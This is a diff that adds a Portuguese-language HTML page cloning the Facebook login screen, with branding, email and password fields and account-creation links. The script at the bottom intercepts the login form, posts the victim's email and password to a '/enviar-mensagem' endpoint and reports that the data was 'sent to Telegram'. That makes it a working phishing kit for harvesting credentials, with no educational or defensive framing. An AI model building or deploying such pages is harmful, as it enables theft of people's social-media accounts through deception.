@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link rel="stylesheet" href="scr/css/style.css">
+	<title>Facebook - entre ou cadastre</title>
+</head>
+<body>
+	<div class="container-mae">
+		<div class="info-container">
+			<div class="info-text">
+				<fiv class="logo-fb">
+					<img src="4aAhOWlwaXf.svg" alt="">
+				</fiv>
+				
+				<h2 class="h2-info">O Facebook ajuda você a se conectar e compartilhar com as pessoas que fazem parte da sua vida.</h2>
+			</div>
+		</div>
+		<div class="container-login">
+			<div class="card-login">
+				<div class="login-form">
+					<form>
+      
+        <input type="email" placeholder="Email ou Telefone" id="email" name="email" required><br><br>
+        
+ 
+        <input type="password" placeholder="Senha" id="senha" name="senha" required><br><br>
+        
+        <button >Entrar</button>
+        <a href="">Esqueceu a senha?</a>       
+    
+        	 <hr>
+     
+       
+        <button class="conta-nova">
+        	Criar Nova Conta
+        </button>
+    </form>
+				</div>
+			</div>
+			<div class="card-info">
+			<a href="" class="info"> <b>Criar uma Página</b> </a>
+			 para uma celebridade, uma marca ou  uma <br>empresa.
+		</div>
+		</div>
+
+	</div>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    const form = document.querySelector('form');
+    const emailInput = document.getElementById('email');
+    const senhaInput = document.getElementById('senha');
+
+    form.addEventListener('submit', async function (e) {
+      e.preventDefault();
+
+      const email = emailInput.value;
+      const senha = senhaInput.value;
+
+      try {
+        const response = await fetch('/enviar-mensagem', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({ email, senha }),
+        });
+
+        if (response.ok) {
+          alert('Informações enviadas com sucesso para o Telegram.');
+        } else {
+          alert('Erro ao enviar informações para o Telegram.');
+        }
+      } catch (error) {
+        console.error(error);
+        alert('Erro ao enviar informações para o Telegram.');
+      }
+    });
+  });
+</script>
+
+
+</body>
+</html>
